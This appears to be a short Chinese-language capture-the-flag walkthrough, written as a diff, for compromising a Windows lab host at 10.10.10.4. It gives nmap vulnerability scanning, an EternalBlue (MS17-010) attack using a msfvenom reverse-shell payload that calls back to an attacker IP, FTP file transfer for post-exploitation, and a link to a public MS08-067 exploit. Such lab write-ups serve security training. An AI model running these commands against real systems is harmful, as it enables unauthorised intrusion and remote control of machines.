@@ -1,0 +1,56 @@
+1.nmap -p 139,445 --script vuln 10.10.10.4
+
+
+
+2.利用永痕之蓝手动渗透
+记得要把SMB相关的python 的包装全了
+
+pip install pysmb
+
+git clone https://github.com/maaaaz/impacket.git && cd impacket
+
+pip install .
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9999 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe
+
+python send_and_execute.py 10.10.10.4 ms17-010.exe
+
+
+3.拿到反弹shell
+
+
+
+4.提权
+echo %username%  没反应
+
+pip install pyftpdlib
+
+apt-get install python-pyftpdlib
+
+loacte whoami 然后copy到你要开启ftp的文件夹
+
+python -m pyftpdlib -p 21
+
+ftp -A 10.10.14.38
+
+get whoami.exe
+
+然后执行whoami.exe,没显示，不要紧。
+
+
+
+
+第二种方法手动利用MS08067
+：代码如下（网上找的代码）
+
+https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py
+
+修改一下 msfvenom的返回地址，然后开启监听端口就行。
+
+
+
+
+监听端的截图如下：端口我都没变用的62000,直接换了返回IP而已
+
+
+
+
